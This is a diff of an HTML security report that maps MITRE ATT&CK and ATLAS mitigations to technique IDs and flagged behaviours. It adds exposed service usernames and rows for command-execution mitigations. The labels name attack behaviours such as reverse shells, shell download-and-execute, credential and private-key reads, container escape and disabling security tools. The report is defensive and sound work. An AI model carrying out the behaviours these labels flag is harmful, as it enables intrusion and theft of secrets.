+<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1028 Operating System Configuration</td><td class="cell">T1053.002, T1087.001, T1548.001, T1548.003, T1552.003, T1690</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Operating System Configuration involves adjusting system settings and hardening the default configurations of an operating system (OS) to mitigate adversary exploitation and prevent abuse of system functionality.</p>
-<div class="pair"><span class="label">for</span><span class="value">ScheduledJobCreation, SetuidBit, SudoersModification, ShellHistoryRead, HistoryDisabling</span></div>
+<div class="pair"><span class="label">exposed</span><span class="value">username: app_rw</span></div>
+<div class="pair"><span class="label"></span><span class="value">username: daemon</span></div>
+<div class="pair"><span class="label"></span><span class="value">username: deploy</span></div>
+<div class="pair"><span class="label"></span><span class="value">username: root</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ScheduledJobCreation, LocalAccountDiscovery, SetuidBit, SudoersModification, ShellHistoryRead, HistoryDisabling</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1029 Remote Data Storage</td><td class="cell">T1070.003, T1685.006</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
@@ -871,13 +929,13 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <p>Use intrusion detection signatures to block traffic at network boundaries.</p>
 <div class="pair"><span class="label">for</span><span class="value">FileUpload, ReverseShell, ShellDownloadAndExecute</span></div>
 </div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1032 Multi-factor Authentication</td><td class="cell">T1136.001</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1032 Multi-factor Authentication</td><td class="cell">T1021.004, T1136.001</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Multi-Factor Authentication (MFA) enhances security by requiring users to provide at least two forms of verification to prove their identity before granting access.</p>
 <div class="pair"><span class="label">exposed</span><span class="value">username: svc</span></div>
 <div class="pair"><span class="label">for</span><span class="value">AccountCreation</span></div>
 </div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1033 Limit Software Installation</td><td class="cell">T1543.002</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1033 Limit Software Installation</td><td class="cell">T1059, T1543.002</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Prevent users or groups from installing unauthorized or unapproved software to reduce the risk of introducing malicious or vulnerable applications.</p>
 <div class="pair"><span class="label">for</span><span class="value">SystemdUnitCreation</span></div>
@@ -892,7 +950,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <p>Employ network appliances and endpoint software to filter ingress, egress, and lateral network traffic.</p>
 <div class="pair"><span class="label">for</span><span class="value">FileUpload, ReverseShell, ShellDownloadAndExecute, CloudMetadataAccess</span></div>
 </div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1038 Execution Prevention</td><td class="cell">T1059.004, T1611, T1685</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1038 Execution Prevention</td><td class="cell">T1059, T1059.004, T1611, T1685</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Prevent the execution of unauthorized or malicious code on systems by implementing application control, script blocking, and other execution prevention mechanisms.</p>
 <div class="pair"><span class="label">for</span><span class="value">ShellDownloadAndExecute, ReverseShell, ContainerEscape, SecurityToolDisabling</span></div>
@@ -907,12 +965,12 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <p>Protect sensitive information at rest, in transit, and during processing by using strong encryption algorithms.</p>
 <div class="pair"><span class="label">for</span><span class="value">PrivateKeyRead, LogDeletion</span></div>
 </div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1042 Disable or Remove Feature or Program</td><td class="cell">T1098.004, T1552.005, T1611, T1685</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1042 Disable or Remove Feature or Program</td><td class="cell">T1021.004, T1059, T1098.004, T1552.005, T1611, T1685</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Disable or remove unnecessary and potentially vulnerable software, features, or services to reduce the attack surface and prevent abuse by adversaries.</p>
 <div class="pair"><span class="label">for</span><span class="value">SshKeyPersistence, CloudMetadataAccess, ContainerEscape, SecurityToolDisabling</span></div>
 </div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1047 Audit</td><td class="cell">T1053.002, T1053.003, T1095, T1552.001, T1552.004, T1560.001, T1685, T1685.004, T1686</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1047 Audit</td><td class="cell">T1053.002, T1053.003, T1059, T1095, T1552.001, T1552.004, T1560.001, T1685, T1685.004, T1686</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Auditing is the process of recording activity and systematically reviewing and analyzing the activity and system configurations.</p>
 <div class="pair"><span class="label">for</span><span class="value">ScheduledJobCreation, ReverseShell, CredentialFileRead, PrivateKeyRead, ArchiveCreation, SecurityToolDisabling, FirewallDisabling</span></div>
@@ -937,6 +995,22 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <p>Data Loss Prevention (DLP) involves implementing strategies and technologies to identify, categorize, monitor, and control the movement of sensitive data within an organization.</p>
 <div class="pair"><span class="label">for</span><span class="value">FileUpload</span></div>
 </div></td></tr>
+<tr class="entry"><td class="mark medium">[!]</td><td class="cell">M1021 Restrict Web-Based Content</td><td class="cell">T1059</td></tr>
+<tr class="detail"><td colspan="3"><div class="under">
+<p>Restricting web-based content involves enforcing policies and technologies that limit access to potentially malicious websites, unsafe downloads, and unauthorized browser behaviors.</p>
+</div></td></tr>
+<tr class="entry"><td class="mark medium">[!]</td><td class="cell">M1040 Behavior Prevention on Endpoint</td><td class="cell">T1059</td></tr>
+<tr class="detail"><td colspan="3"><div class="under">
+<p>Behavior Prevention on Endpoint refers to the use of technologies and strategies to detect and block potentially malicious activities by analyzing the behavior of processes, files, API calls, and other endpoint events.</p>
+</div></td></tr>
+<tr class="entry"><td class="mark medium">[!]</td><td class="cell">M1045 Code Signing</td><td class="cell">T1059</td></tr>
+<tr class="detail"><td colspan="3"><div class="under">
+<p>Code Signing is a security process that ensures the authenticity and integrity of software by digitally signing executables, scripts, and other code artifacts.</p>
+</div></td></tr>
+<tr class="entry"><td class="mark medium">[!]</td><td class="cell">M1049 Antivirus/Antimalware</td><td class="cell">T1059</td></tr>
+<tr class="detail"><td colspan="3"><div class="under">
+<p>Antivirus/Antimalware solutions utilize signatures, heuristics, and behavioral analysis to detect, block, and remediate malicious software, including viruses, trojans, ransomware, and spyware.</p>
+</div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">AML.M0005 Control Access to AI Models and Data at Rest</td><td class="cell">AML.T0025</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Establish access controls on internal model registries and limit internal access to production models.</p>
@@ -956,7 +1030,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Organizations should control external resources created or acquired by AI agents during execution by treating those resources as attributable, lifecycle-managed assets.</p>
 <div class="pair"><span class="label">exposed</span><span class="value">username: svc</span></div>
-<div class="pair"><span class="label">for</span><span class="value">ShellDownloadAndExecute, AccountCreation</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ShellDownloadAndExecute, ReverseShell, AccountCreation</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark low">[i]</td><td class="cell">AML.M0020 Generative AI Guardrails</td><td class="cell">AML.T0102</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
